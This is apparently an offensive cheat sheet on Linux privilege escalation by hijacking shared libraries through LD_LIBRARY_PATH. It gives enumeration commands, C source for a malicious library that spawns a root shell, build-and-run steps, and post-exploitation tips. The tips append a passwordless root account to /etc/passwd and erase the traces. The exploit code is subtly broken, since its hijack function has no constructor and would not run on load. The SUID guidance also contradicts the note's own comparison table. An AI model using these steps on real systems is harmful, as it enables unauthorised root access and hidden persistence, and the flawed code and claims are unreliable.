### 1. Technique Name:

Shared Libraries – LD_LIBRARY_PATH Privilege Escalation
### 2. Summary:

`LD_LIBRARY_PATH` is an environment variable used to specify additional directories where the dynamic linker should look for shared libraries **before** the standard paths like `/lib` or `/usr/lib`. If a **SUID binary** or **script** relies on a shared library in a path controllable by the attacker (and does not sanitize `LD_LIBRARY_PATH`), it can be tricked into loading a malicious library, resulting in privilege escalation.
### 3. Conditions / Requirements:

- You have write access to a directory added to `LD_LIBRARY_PATH`    
- The binary being executed is **dynamically linked**
- Either:
    - You can set `LD_LIBRARY_PATH` freely (script or binary is run directly), **or**    
    - The binary runs without stripping environment variables (e.g., not a hardened SUID binary, or is run via sudo with `LD_LIBRARY_PATH` preserved)

> Note: Most modern systems ignore `LD_LIBRARY_PATH` for **SUID binaries** by default for security. However, it can still be abused in custom SUID binaries, misconfigured startup scripts, or development environments.
### 4. Enumeration Steps:
#### A. Check for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```
#### B. Verify if dynamically linked:

```bash
ldd /path/to/suid_binary
```
#### C. Identify a vulnerable library in the output that can be hijacked:

```bash
libcustom.so => not found
```
### 5. Exploitation Steps:
#### A. Write a malicious replacement for a missing or hijackable library:

```c
// hijack.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void hijack() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```
#### B. Compile the library:

```bash
gcc -shared -fPIC -o libcustom.so hijack.c
```
#### C. Set `LD_LIBRARY_PATH` to include current directory:

```bash
export LD_LIBRARY_PATH=.
```
#### D. Run the vulnerable binary:

```bash
./vulnerable_binary
```

If the binary imports `libcustom.so`, your function will be called with root privileges.
### 6. Post-Exploitation Tips:

- If it drops you to a root shell, use it to create persistence:    

```bash
echo 'h4x::0:0:root:/root:/bin/bash' >> /etc/passwd
```

- Restore environment and clean malicious lib:

```bash
unset LD_LIBRARY_PATH
rm ./libcustom.so
```
### 7. Example:

Let’s say you have a binary like this:

```bash
./dev_suid_binary
```

Its `ldd` output shows:

```bash
libhax.so => not found
```

You compile a malicious `libhax.so`, export the path:

```bash
gcc -shared -fPIC -o libhax.so hijack.c
export LD_LIBRARY_PATH=.
./dev_suid_binary
```

It runs as root and executes your payload.
### Comparison with LD_PRELOAD:

|Feature|LD_PRELOAD|LD_LIBRARY_PATH|
|---|---|---|
|Loads before everything|Yes|No, only used to find libs, not override system ones|
|Works with SUID?|No (unless explicitly allowed via sudo)|No (stripped by dynamic linker for SUIDs)|
|Useful when?|Function override in loaded binaries|Custom library loading by name|
|Example use case|Hijack `malloc`, `getenv`, etc.|Supply missing `libxyz.so`|
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Shared_Libraries #LD_LIBRARY_PATH